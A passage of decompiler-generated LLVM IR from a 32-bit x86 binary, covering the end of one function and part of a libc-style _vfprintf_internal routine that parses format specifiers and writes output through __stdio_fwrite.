  %v5_804e750 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e74b, i32 %arg1, i32 %v0_804e746)
  br label %dec_label_pc_804e758

dec_label_pc_804e758:                             ; preds = %dec_label_pc_804e740, %dec_label_pc_804e746
  %v1_804e758 = phi i32 [ 0, %dec_label_pc_804e740 ], [ %v5_804e750, %dec_label_pc_804e746 ]
  %v0_804e758 = load i32, i32* @ebp, align 4
  %v2_804e758 = add i32 %v0_804e758, %v1_804e758
  br label %dec_label_pc_804e75a

dec_label_pc_804e75a:                             ; preds = %dec_label_pc_804e728, %dec_label_pc_804e758
  %v0_804e75d = phi i32 [ %v0_804e733, %dec_label_pc_804e728 ], [ %v2_804e758, %dec_label_pc_804e758 ]
  ret i32 %v0_804e75d

; uselistorder directives
  uselistorder i32 %v0_804e74b, { 1, 0 }
  uselistorder i32 %v0_804e733, { 1, 2, 0 }
  uselistorder i32 %v1_804e72c, { 1, 0 }
  uselistorder i32 %v2_804e720, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e75a, { 1, 0 }
  uselistorder label %dec_label_pc_804e758, { 1, 0 }
  uselistorder label %dec_label_pc_804e740, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e767 = load i32, i32* @ebx, align 4
  store i32 %v0_804e767, i32* %stack_var_-16, align 4
  %v4_804e767 = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e768 = add i32 %v4_804e767, -356
  %v10_804e768 = icmp slt i32 %v1_804e768, 0
  store i1 %v10_804e768, i1* %sf.global-to-local, align 1
  %v4_804e76e = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e76e, i32* @ebx, align 4
  %v2_804e776 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e776, i32* @esi, align 4
  %v5_804e77b = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e76e)
  store i32 %v5_804e77b, i32* %eax.global-to-local, align 4
  %v2_804e783 = icmp slt i32 %v5_804e77b, 0
  store i1 %v2_804e783, i1* %sf.global-to-local, align 1
  %v1_804e785 = icmp eq i1 %v2_804e783, false
  br i1 %v1_804e785, label %dec_label_pc_804e7c5, label %dec_label_pc_804e787

dec_label_pc_804e787:                             ; preds = %entry
  %v12_804e780 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e787 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e787, i32* @ebx, align 4
  %v1_804e78b = add i32 %v12_804e780, -12
  %v10_804e78b = icmp slt i32 %v1_804e78b, 0
  store i1 %v10_804e78b, i1* %sf.global-to-local, align 1
  %v5_804e78e = inttoptr i32 %v3_804e787 to i8*
  %v3_804e78f = call i32 @strlen(i8* %v5_804e78e)
  store i32 %v3_804e78f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e79e = icmp eq i32 %v3_804e78f, 0
  %v2_804e79e = icmp slt i32 %v3_804e78f, 0
  store i1 %v2_804e79e, i1* %sf.global-to-local, align 1
  br i1 %v1_804e79e, label %dec_label_pc_804ed0e, label %dec_label_pc_804e7a6

dec_label_pc_804e7a6:                             ; preds = %dec_label_pc_804e787
  %v0_804e7a6 = load i32, i32* @edx, align 4
  %v0_804e7af = load i32, i32* @ebx, align 4
  %v6_804e7b0 = call i32 @__stdio_fwrite(i32 %v0_804e7af, i32 %v3_804e78f, i32 %arg1, i32 %v0_804e7a6)
  store i32 %v6_804e7b0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e7bd = load i32, i32* @esp, align 4
  %v1_804e7bd = add i32 %v0_804e7bd, 16
  %v7_804e7bd = icmp slt i32 %v1_804e7bd, 0
  store i1 %v7_804e7bd, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ed0e

dec_label_pc_804e7c5:                             ; preds = %entry
  %v6_804e7cf = call i32 @_ppfs_prepargs(i32 %v2_804e776, i32 %arg3, i32 %v5_804e77b, i32 %v5_804e77b)
  store i32 %v6_804e7cf, i32* %eax.global-to-local, align 4
  %v0_804e7d4 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7d4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e7de = load i32, i32* @esp, align 4
  %v1_804e7de = add i32 %v0_804e7de, 16
  %v7_804e7de = icmp slt i32 %v1_804e7de, 0
  store i1 %v7_804e7de, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e7e4

dec_label_pc_804e7e3:                             ; preds = %dec_label_pc_804e7ea
  %v1_804e7e3 = add i32 %v0_804e7f2, 1
  %v9_804e7e3 = icmp slt i32 %v1_804e7e3, 0
  store i1 %v9_804e7e3, i1* %sf.global-to-local, align 1
  store i32 %v1_804e7e3, i32* @ebx, align 4
  br label %dec_label_pc_804e7e4.backedge

dec_label_pc_804e7e4.backedge:                    ; preds = %dec_label_pc_804e7e3, %dec_label_pc_804ecf4, %dec_label_pc_804ecff
  %v1_804e7ee21 = phi i32 [ %v1_804e7f6, %dec_label_pc_804e7e3 ], [ %v3_804ecf4, %dec_label_pc_804ecf4 ], [ %v1_804e822, %dec_label_pc_804ecff ]
  %v0_804e7e419 = phi i32 [ %v1_804e7e3, %dec_label_pc_804e7e3 ], [ %v3_804ecf4, %dec_label_pc_804ecf4 ], [ %v1_804ecff, %dec_label_pc_804ecff ]
  %v4_804e7e4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e7e4

dec_label_pc_804e7e4:                             ; preds = %dec_label_pc_804e7e4.backedge, %dec_label_pc_804e7c5
  %v1_804e7f6 = phi i32 [ %v1_804e7ee21, %dec_label_pc_804e7e4.backedge ], [ %v0_804e7d4, %dec_label_pc_804e7c5 ]
  %v0_804e7f2 = phi i32 [ %v0_804e7e419, %dec_label_pc_804e7e4.backedge ], [ %v0_804e7d4, %dec_label_pc_804e7c5 ]
  %v4_804e7e4 = phi i32 [ %v4_804e7e4.pre, %dec_label_pc_804e7e4.backedge ], [ %v6_804e7cf, %dec_label_pc_804e7c5 ]
  %v1_804e7e4 = inttoptr i32 %v0_804e7f2 to i8*
  %v2_804e7e4 = load i8, i8* %v1_804e7e4, align 1
  %v3_804e7e4 = zext i8 %v2_804e7e4 to i32
  %v5_804e7e4 = and i32 %v4_804e7e4, -256
  %v6_804e7e4 = or i32 %v3_804e7e4, %v5_804e7e4
  store i32 %v6_804e7e4, i32* %eax.global-to-local, align 4
  %v4_804e7e6 = icmp eq i8 %v2_804e7e4, 0
  %v5_804e7e6 = icmp slt i8 %v2_804e7e4, 0
  store i1 %v5_804e7e6, i1* %sf.global-to-local, align 1
  br i1 %v4_804e7e6, label %dec_label_pc_804e7ee, label %dec_label_pc_804e7ea

dec_label_pc_804e7ea:                             ; preds = %dec_label_pc_804e7e4
  %v2_804e7ea = add i8 %v2_804e7e4, -37
  %v10_804e7ea = icmp eq i8 %v2_804e7ea, 0
  %v11_804e7ea = icmp slt i8 %v2_804e7ea, 0
  store i1 %v11_804e7ea, i1* %sf.global-to-local, align 1
  %v1_804e7ec = icmp eq i1 %v10_804e7ea, false
  br i1 %v1_804e7ec, label %dec_label_pc_804e7e3, label %dec_label_pc_804e7ee

dec_label_pc_804e7ee:                             ; preds = %dec_label_pc_804e7ea, %dec_label_pc_804e7e4
  %v2_804e7ee = sub i32 %v0_804e7f2, %v1_804e7f6
  %v12_804e7ee = icmp eq i32 %v2_804e7ee, 0
  %v13_804e7ee = icmp slt i32 %v2_804e7ee, 0
  store i1 %v13_804e7ee, i1* %sf.global-to-local, align 1
  br i1 %v12_804e7ee, label %dec_label_pc_804e819, label %dec_label_pc_804e7f2

dec_label_pc_804e7f2:                             ; preds = %dec_label_pc_804e7ee
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e7ee, i32* @esi, align 4
  store i1 %v13_804e7ee, i1* %sf.global-to-local, align 1
  %tmp66 = icmp slt i32 %v2_804e7ee, 1
  br i1 %tmp66, label %dec_label_pc_804e80e, label %dec_label_pc_804e7fc

dec_label_pc_804e7fc:                             ; preds = %dec_label_pc_804e7f2
  %v0_804e7fc = load i32, i32* @ebp, align 4
  %v1_804e7fc = load i32, i32* @esp, align 4
  %v2_804e7fc = add i32 %v1_804e7fc, -4
  %v3_804e7fc = inttoptr i32 %v2_804e7fc to i32*
  store i32 %v0_804e7fc, i32* %v3_804e7fc, align 4
  %v1_804e7fd = add i32 %v1_804e7fc, 368
  %v2_804e7fd = inttoptr i32 %v1_804e7fd to i32*
  %v3_804e7fd = load i32, i32* %v2_804e7fd, align 4
  %v5_804e7fd = add i32 %v1_804e7fc, -8
  %v6_804e7fd = inttoptr i32 %v5_804e7fd to i32*
  store i32 %v3_804e7fd, i32* %v6_804e7fd, align 4
  %v0_804e804 = load i32, i32* @esi, align 4
  %v2_804e804 = add i32 %v1_804e7fc, -12
  %v3_804e804 = inttoptr i32 %v2_804e804 to i32*
  store i32 %v0_804e804, i32* %v3_804e804, align 4
  %v0_804e805 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e805 = add i32 %v1_804e7fc, -16
  %v3_804e805 = inttoptr i32 %v2_804e805 to i32*
  store i32 %v0_804e805, i32* %v3_804e805, align 4
  %v0_804e806 = load i32, i32* %stack_var_-364, align 4
  %v4_804e806 = call i32 @__stdio_fwrite(i32 %v0_804e806, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e806, i32* %eax.global-to-local, align 4
  %v0_804e80b = load i32, i32* @esp, align 4
  %v1_804e80b = add i32 %v0_804e80b, 16
  %v7_804e80b = icmp slt i32 %v1_804e80b, 0
  store i1 %v7_804e80b, i1* %sf.global-to-local, align 1
  %v1_804e80e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e80e

dec_label_pc_804e80e:                             ; preds = %dec_label_pc_804e7f2, %dec_label_pc_804e7fc
  %v3_804e816 = phi i32 [ %v2_804e7ee, %dec_label_pc_804e7f2 ], [ %v1_804e80e.pre, %dec_label_pc_804e7fc ]
  %v0_804e80e = phi i32 [ 0, %dec_label_pc_804e7f2 ], [ %v4_804e806, %dec_label_pc_804e7fc ]
  %v2_804e80e = sub i32 %v0_804e80e, %v3_804e816
  %v12_804e80e = icmp eq i32 %v2_804e80e, 0
  %v13_804e80e = icmp slt i32 %v2_804e80e, 0
  store i1 %v13_804e80e, i1* %sf.global-to-local, align 1
  %v1_804e810 = icmp eq i1 %v12_804e80e, false
  %v0_804ed07.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e810, label %dec_label_pc_804ed07, label %dec_label_pc_804e816

dec_label_pc_804e816:                             ; preds = %dec_label_pc_804e80e
  %v1_804e816 = inttoptr i32 %v0_804ed07.pre.pre to i32*
  %v2_804e816 = load i32, i32* %v1_804e816, align 4
  %v4_804e816 = add i32 %v2_804e816, %v3_804e816
  %v15_804e816 = icmp slt i32 %v4_804e816, 0
  store i1 %v15_804e816, i1* %sf.global-to-local, align 1
  store i32 %v4_804e816, i32* %v1_804e816, align 4
  %v0_804e819.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e819

dec_label_pc_804e819:                             ; preds = %dec_label_pc_804e7ee, %dec_label_pc_804e816
  %v0_804ecff = phi i32 [ %v0_804e7f2, %dec_label_pc_804e7ee ], [ %v0_804e819.pre, %dec_label_pc_804e816 ]
  %v1_804e819 = inttoptr i32 %v0_804ecff to i8*
  %v2_804e819 = load i8, i8* %v1_804e819, align 1
  %v3_804e819 = icmp eq i8 %v2_804e819, 0
  %v4_804e819 = icmp slt i8 %v2_804e819, 0
  store i1 %v4_804e819, i1* %sf.global-to-local, align 1
  br i1 %v3_804e819, label %dec_label_pc_804ed0e, label %dec_label_pc_804e822

dec_label_pc_804e822:                             ; preds = %dec_label_pc_804e819
  %v1_804e822 = add i32 %v0_804ecff, 1
  %v2_804e822 = inttoptr i32 %v1_804e822 to i8*
  %v3_804e822 = load i8, i8* %v2_804e822, align 1
  %v4_804e822 = add i8 %v3_804e822, -37
  %v12_804e822 = icmp eq i8 %v4_804e822, 0
  %v13_804e822 = icmp slt i8 %v4_804e822, 0
  store i1 %v13_804e822, i1* %sf.global-to-local, align 1
  store i32 %v1_804e822, i32* %edx.global-to-local, align 4
  br i1 %v12_804e822, label %dec_label_pc_804ecff, label %dec_label_pc_804e82f

dec_label_pc_804e82f:                             ; preds = %dec_label_pc_804e822
  %v1_804e82f = load i32, i32* @esp, align 4
  %v2_804e82f = add i32 %v1_804e82f, 16
  %v3_804e82f = inttoptr i32 %v2_804e82f to i32*
  store i32 %v1_804e822, i32* %v3_804e82f, align 4
  %v0_804e833 = load i32, i32* @esp, align 4
  %v1_804e833 = add i32 %v0_804e833, 340
  %v2_804e833 = inttoptr i32 %v1_804e833 to i32*
  store i32 0, i32* %v2_804e833, align 4
  %v0_804e83e = load i32, i32* @esp, align 4
  %v1_804e83e = add i32 %v0_804e83e, -12
  %v10_804e83e = icmp slt i32 %v1_804e83e, 0
  store i1 %v10_804e83e, i1* %sf.global-to-local, align 1
  %v1_804e841 = add i32 %v0_804e83e, 16
  store i32 %v1_804e841, i32* @ebx, align 4
  %v2_804e845 = add i32 %v0_804e83e, -16
  %v3_804e845 = inttoptr i32 %v2_804e845 to i32*
  store i32 %v1_804e841, i32* %v3_804e845, align 4
  %v0_804e846 = load i32, i32* %stack_var_-364, align 4
  %v1_804e846 = inttoptr i32 %v0_804e846 to i32*
  %v2_804e846 = call i32 @_ppfs_parsespec(i32* %v1_804e846)
  store i32 %v2_804e846, i32* %eax.global-to-local, align 4
  %v0_804e84b = load i32, i32* @ebx, align 4
  %v1_804e84b = load i32, i32* @esp, align 4
  %v2_804e84b = inttoptr i32 %v1_804e84b to i32*
  store i32 %v0_804e84b, i32* %v2_804e84b, align 4
  %v0_804e84e = load i32, i32* %stack_var_-364, align 4
  %v1_804e84e = call i32 @_ppfs_setargs(i32 %v0_804e84e)
  store i32 %v1_804e84e, i32* %eax.global-to-local, align 4
  %v0_804e853 = load i32, i32* @esp, align 4
  %v1_804e853 = add i32 %v0_804e853, 70
  %v2_804e853 = inttoptr i32 %v1_804e853 to i8*
  %v3_804e853 = load i8, i8* %v2_804e853, align 1
  %v4_804e853 = zext i8 %v3_804e853 to i32
  store i32 %v4_804e853, i32* @edi, align 4
  %v1_804e858 = add i32 %v0_804e853, 16
  %v1_804e85b = add i32 %v0_804e853, 56
  %v2_804e85b = inttoptr i32 %v1_804e85b to i32*
  %v3_804e85b = load i32, i32* %v2_804e85b, align 4
  %v5_804e85b = icmp slt i32 %v3_804e85b, 0
  store i1 %v5_804e85b, i1* %sf.global-to-local, align 1
  %v1_804e860 = add i32 %v0_804e853, 112
  store i32 %v1_804e860, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804e85b, 1
  br i1 %tmp67, label %dec_label_pc_804e86d, label %dec_label_pc_804e866

dec_label_pc_804e866:                             ; preds = %dec_label_pc_804e82f
  %v2_804e866 = zext i8 %v3_804e853 to i32
  %v3_804e866 = mul nuw nsw i32 %v2_804e866, 12
  store i32 %v3_804e866, i32* %eax.global-to-local, align 4
  %v2_804e869 = add i32 %v0_804e853, 100
  %v3_804e869 = add i32 %v2_804e869, %v3_804e866
  store i32 %v3_804e869, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e86d

dec_label_pc_804e86d:                             ; preds = %dec_label_pc_804e82f, %dec_label_pc_804e866
  %v0_804e87528 = phi i32 [ %v1_804e860, %dec_label_pc_804e82f ], [ %v3_804e869, %dec_label_pc_804e866 ]
  %v1_804e86d = add i32 %v0_804e853, 60
  %v2_804e86d = inttoptr i32 %v1_804e86d to i32*
  %v3_804e86d = load i32, i32* %v2_804e86d, align 4
  store i32 %v3_804e86d, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e88073 = sub i32 0, %v3_804e86d
  %v10_804e88076 = and i32 %v3_804e86d, %v2_804e88073
  %v11_804e88077 = icmp slt i32 %v10_804e88076, 0
  %v13_804e88078 = icmp slt i32 %v2_804e88073, 0
  %v2_804e88279 = icmp eq i1 %v13_804e88078, %v11_804e88077
  br i1 %v2_804e88279, label %dec_label_pc_804e884, label %dec_label_pc_804e875

dec_label_pc_804e875:                             ; preds = %dec_label_pc_804e86d, %dec_label_pc_804e875
  %v0_804e88483 = phi i32 [ %v0_804e884, %dec_label_pc_804e875 ], [ %v1_804e858, %dec_label_pc_804e86d ]
  %v2_804e87582 = phi i32 [ %v1_804e87f, %dec_label_pc_804e875 ], [ 0, %dec_label_pc_804e86d ]
  %v0_804e87581 = phi i32 [ %v1_804e87c, %dec_label_pc_804e875 ], [ %v0_804e87528, %dec_label_pc_804e86d ]
  %v3_804e875 = mul i32 %v2_804e87582, 4
  %v4_804e875 = add i32 %v3_804e875, 344
  %v5_804e875 = add i32 %v4_804e875, %v0_804e88483
  %v6_804e875 = inttoptr i32 %v5_804e875 to i32*
  store i32 %v0_804e87581, i32* %v6_804e875, align 4
  %v0_804e87c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e87c = add i32 %v0_804e87c, 12
  store i32 %v1_804e87c, i32* %edx.global-to-local, align 4
  %v0_804e87f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e87f = add i32 %v0_804e87f, 1
  %v1_804e880.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e87f, i32* %eax.global-to-local, align 4
  %v2_804e880 = sub i32 %v1_804e87f, %v1_804e880.pre
  %v8_804e880 = xor i32 %v1_804e87f, %v1_804e880.pre
  %v9_804e880 = xor i32 %v2_804e880, %v1_804e87f
  %v10_804e880 = and i32 %v9_804e880, %v8_804e880
  %v11_804e880 = icmp slt i32 %v10_804e880, 0
  %v13_804e880 = icmp slt i32 %v2_804e880, 0
  %v2_804e882 = icmp eq i1 %v13_804e880, %v11_804e880
  %v0_804e884 = load i32, i32* @esp, align 4
  br i1 %v2_804e882, label %dec_label_pc_804e884, label %dec_label_pc_804e875

dec_label_pc_804e884:                             ; preds = %dec_label_pc_804e875, %dec_label_pc_804e86d
  %v0_804e884.lcssa = phi i32 [ %v1_804e858, %dec_label_pc_804e86d ], [ %v0_804e884, %dec_label_pc_804e875 ]
  %v1_804e884 = add i32 %v0_804e884.lcssa, 48
  %v2_804e884 = inttoptr i32 %v1_804e884 to i32*
  %v3_804e884 = load i32, i32* %v2_804e884, align 4
  store i32 %v3_804e884, i32* @ecx, align 4
  %v1_804e888 = icmp eq i32 %v3_804e884, 0
  %v2_804e888 = icmp slt i32 %v3_804e884, 0
  store i1 %v2_804e888, i1* %sf.global-to-local, align 1
  %v1_804e88a = icmp eq i1 %v1_804e888, false
  br i1 %v1_804e88a, label %dec_label_pc_804e8b2, label %dec_label_pc_804e88c

dec_label_pc_804e88c:                             ; preds = %dec_label_pc_804e884
  %v1_804e88c = inttoptr i32 %v0_804e884.lcssa to i32*
  %v2_804e88c = load i32, i32* %v1_804e88c, align 4
  store i32 %v2_804e88c, i32* %eax.global-to-local, align 4
  %v1_804e88f = ashr i32 %v2_804e88c, 31
  store i32 %v1_804e88f, i32* %edx.global-to-local, align 4
  %v2_804e890 = add i32 %v0_804e884.lcssa, -4
  %v3_804e890 = inttoptr i32 %v2_804e890 to i32*
  store i32 %v1_804e88f, i32* %v3_804e890, align 4
  %v0_804e891 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e891 = add i32 %v0_804e884.lcssa, -8
  %v3_804e891 = inttoptr i32 %v2_804e891 to i32*
  store i32 %v0_804e891, i32* %v3_804e891, align 4
  %v1_804e892 = add i32 %v0_804e884.lcssa, 32
  %v2_804e892 = inttoptr i32 %v1_804e892 to i32*
  %v3_804e892 = load i32, i32* %v2_804e892, align 4
  %v1_804e896 = and i32 %v3_804e892, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e896, i32* %eax.global-to-local, align 4
  %v2_804e89b = add i32 %v0_804e884.lcssa, -12
  %v3_804e89b = inttoptr i32 %v2_804e89b to i32*
  store i32 %v1_804e896, i32* %v3_804e89b, align 4
  %v1_804e89c = add i32 %v0_804e884.lcssa, 344
  %v2_804e89c = inttoptr i32 %v1_804e89c to i32*
  %v3_804e89c = load i32, i32* %v2_804e89c, align 4
  store i32 %v3_804e89c, i32* %eax.global-to-local, align 4
  %v1_804e8a3 = inttoptr i32 %v3_804e89c to i32*
  %v2_804e8a3 = load i32, i32* %v1_804e8a3, align 4
  %v4_804e8a3 = add i32 %v0_804e884.lcssa, -16
  %v5_804e8a3 = inttoptr i32 %v4_804e8a3 to i32*
  store i32 %v2_804e8a3, i32* %v5_804e8a3, align 4
  %v0_804e8a5 = call i32 @_store_inttype()
  store i32 %v0_804e8a5, i32* %eax.global-to-local, align 4
  %v0_804e8aa = load i32, i32* @esp, align 4
  %v1_804e8aa = add i32 %v0_804e8aa, 16
  %v7_804e8aa = icmp slt i32 %v1_804e8aa, 0
  store i1 %v7_804e8aa, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ecf4

dec_label_pc_804e8b2:                             ; preds = %dec_label_pc_804e884
  %v1_804e8b2 = add i32 %v3_804e884, -7
  %v5_804e8b2 = icmp ult i32 %v3_804e884, 7
  %v9_804e8b2 = icmp eq i32 %v1_804e8b2, 0
  %v10_804e8b2 = icmp slt i32 %v1_804e8b2, 0
  store i1 %v10_804e8b2, i1* %sf.global-to-local, align 1
  %v2_804e8b5 = or i1 %v5_804e8b2, %v9_804e8b2
  br i1 %v2_804e8b5, label %dec_label_pc_804e8bb, label %dec_label_pc_804ea1f

dec_label_pc_804e8bb:                             ; preds = %dec_label_pc_804e8b2
  %v1_804e8bb = add i32 %v3_804e884, 134574992
  %v2_804e8bb = inttoptr i32 %v1_804e8bb to i8*
  %v3_804e8bb = load i8, i8* %v2_804e8bb, align 1
  %v4_804e8bb = sext i8 %v3_804e8bb to i32
  store i32 %v4_804e8bb, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e8c7 = icmp eq i8 %v3_804e8bb, 10
  %v10_804e8c7 = icmp slt i8 %v3_804e8bb, 10
  store i1 %v10_804e8c7, i1* %sf.global-to-local, align 1
  %v1_804e8ca = icmp eq i1 %v9_804e8c7, false
  br i1 %v1_804e8ca, label %dec_label_pc_804e8ea, label %dec_label_pc_804e8cc

dec_label_pc_804e8cc:                             ; preds = %dec_label_pc_804e8bb
  %v1_804e8cc = add i32 %v0_804e884.lcssa, 32
  %v2_804e8cc = inttoptr i32 %v1_804e8cc to i32*
  %v3_804e8cc = load i32, i32* %v2_804e8cc, align 4
  store i32 %v3_804e8cc, i32* %eax.global-to-local, align 4
  %v1_804e8d2 = udiv i32 %v3_804e8cc, 32
  %tmp68 = urem i32 %v1_804e8d2, 2
  %tmp69 = sub nsw i32 45, %tmp68
  %v2_804e8e2 = or i32 %tmp69, 128
  store i32 %v2_804e8e2, i32* %edx.global-to-local, align 4
  %v2_804e8e5 = and i32 %v3_804e8cc, 64
  %v3_804e8e5 = icmp eq i32 %v2_804e8e5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e8e7 = icmp eq i1 %v3_804e8e5, false
  %v4_804e8e7 = select i1 %v1_804e8e7, i32 %v2_804e8e2, i32 %tmp69
  store i32 %v4_804e8e7, i32* @ebx, align 4
  br label %dec_label_pc_804e8ea

dec_label_pc_804e8ea:                             ; preds = %dec_label_pc_804e8bb, %dec_label_pc_804e8cc
  %v1_804e8ea = add i32 %v3_804e884, -5
  %v5_804e8ea = icmp ult i32 %v3_804e884, 5
  %v9_804e8ea = icmp eq i32 %v1_804e8ea, 0
  %v10_804e8ea = icmp slt i32 %v1_804e8ea, 0
  store i1 %v10_804e8ea, i1* %sf.global-to-local, align 1
  %v2_804e8ed = or i1 %v5_804e8ea, %v9_804e8ea
  br i1 %v2_804e8ed, label %dec_label_pc_804e8ef, label %dec_label_pc_804e907

dec_label_pc_804e8ef:                             ; preds = %dec_label_pc_804e8ea
  %v1_804e8ef = add i32 %v3_804e884, -3
  %v9_804e8ef = icmp eq i32 %v1_804e8ef, 0
  %v10_804e8ef = icmp slt i32 %v1_804e8ef, 0
  store i1 %v10_804e8ef, i1* %sf.global-to-local, align 1
  %v1_804e8f2 = icmp eq i1 %v9_804e8ef, false
  br i1 %v1_804e8f2, label %dec_label_pc_804e8fb, label %dec_label_pc_804e8f4

dec_label_pc_804e8f4:                             ; preds = %dec_label_pc_804e8ef
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e909

dec_label_pc_804e8fb:                             ; preds = %dec_label_pc_804e8ef
  %v1_804e8fb = add i32 %v3_804e884, -1
  %v9_804e8fb = icmp eq i32 %v1_804e8fb, 0
  %v10_804e8fb = icmp slt i32 %v1_804e8fb, 0
  store i1 %v10_804e8fb, i1* %sf.global-to-local, align 1
  br i1 %v9_804e8fb, label %dec_label_pc_804e90e, label %dec_label_pc_804e909

dec_label_pc_804e907:                             ; preds = %dec_label_pc_804e8ea
  %v1_804e907 = sub nsw i32 0, %v4_804e8bb
  %v7_804e907 = icmp sgt i8 %v3_804e8bb, 0
  store i1 %v7_804e907, i1* %sf.global-to-local, align 1
  store i32 %v1_804e907, i32* @esi, align 4
  br label %dec_label_pc_804e909

dec_label_pc_804e909:                             ; preds = %dec_label_pc_804e8fb, %dec_label_pc_804e8f4, %dec_label_pc_804e907
  br label %dec_label_pc_804e90e

dec_label_pc_804e90e:                             ; preds = %dec_label_pc_804e8fb, %dec_label_pc_804e909
  %storemerge = phi i32 [ 11, %dec_label_pc_804e909 ], [ 6, %dec_label_pc_804e8fb ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804e90e = add i32 %v0_804e884.lcssa, 20
  %v2_804e90e = inttoptr i32 %v1_804e90e to i32*
  %v3_804e90e = load i32, i32* %v2_804e90e, align 4
  %v5_804e90e = icmp slt i32 %v3_804e90e, 0
  store i1 %v5_804e90e, i1* %sf.global-to-local, align 1
  %v1_804e913 = add i32 %v0_804e884.lcssa, 7
  %v2_804e913 = inttoptr i32 %v1_804e913 to i8*
  store i8 32, i8* %v2_804e913, align 1
  %v0_804e918 = load i1, i1* %sf.global-to-local, align 1
  %v1_804e918 = icmp eq i1 %v0_804e918, false
  br i1 %v1_804e918, label %dec_label_pc_804e922, label %dec_label_pc_804e91a

dec_label_pc_804e91a:                             ; preds = %dec_label_pc_804e90e
  %v0_804e91a = load i32, i32* @esp, align 4
  %v1_804e91a = add i32 %v0_804e91a, 36
  %v2_804e91a = inttoptr i32 %v1_804e91a to i8*
  %v3_804e91a = load i8, i8* %v2_804e91a, align 1
  %v4_804e91a = zext i8 %v3_804e91a to i32
  %v5_804e91a = load i32, i32* %edx.global-to-local, align 4
  %v6_804e91a = and i32 %v5_804e91a, -256
  %v7_804e91a = or i32 %v6_804e91a, %v4_804e91a
  store i32 %v7_804e91a, i32* %edx.global-to-local, align 4
  %v3_804e91e = add i32 %v0_804e91a, 7
  %v4_804e91e = inttoptr i32 %v3_804e91e to i8*
  store i8 %v3_804e91a, i8* %v4_804e91e, align 1
  br label %dec_label_pc_804e922

dec_label_pc_804e922:                             ; preds = %dec_label_pc_804e90e, %dec_label_pc_804e91a
  %v1_804e922 = add i32 %v3_804e884, -1
  %v8_804e922 = icmp eq i32 %v1_804e922, 0
  %v9_804e922 = icmp slt i32 %v1_804e922, 0
  store i1 %v9_804e922, i1* %sf.global-to-local, align 1
  store i32 %v1_804e922, i32* %ecx.global-to-local, align 4
  %v0_804e923 = load i32, i32* @esp, align 4
  %v1_804e923 = add i32 %v0_804e923, 344
  %v2_804e923 = inttoptr i32 %v1_804e923 to i32*
  %v3_804e923 = load i32, i32* %v2_804e923, align 4
  store i32 %v3_804e923, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804e93b.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e922, label %dec_label_pc_804e93b, label %dec_label_pc_804e931

dec_label_pc_804e931:                             ; preds = %dec_label_pc_804e922
  %v2_804e931 = mul i32 %v0_804e93b.pre, 4
  %v3_804e931 = add i32 %v0_804e923, 52
  %v4_804e931 = add i32 %v3_804e931, %v2_804e931
  %v5_804e931 = inttoptr i32 %v4_804e931 to i32*
  %v6_804e931 = load i32, i32* %v5_804e931, align 4
  %v1_804e935 = and i32 %v6_804e931, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804e935, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e93b

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e922, %dec_label_pc_804e931
  %v2_804e93b = add i32 %v0_804e923, -4
  %v3_804e93b = inttoptr i32 %v2_804e93b to i32*
  store i32 %v0_804e93b.pre, i32* %v3_804e93b, align 4
  %v0_804e93c = load i32, i32* @esi, align 4
  %v2_804e93c = add i32 %v0_804e923, -8
  %v3_804e93c = inttoptr i32 %v2_804e93c to i32*
  store i32 %v0_804e93c, i32* %v3_804e93c, align 4
  %v0_804e93d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e93d = add i32 %v0_804e923, -12
  %v3_804e93d = inttoptr i32 %v2_804e93d to i32*
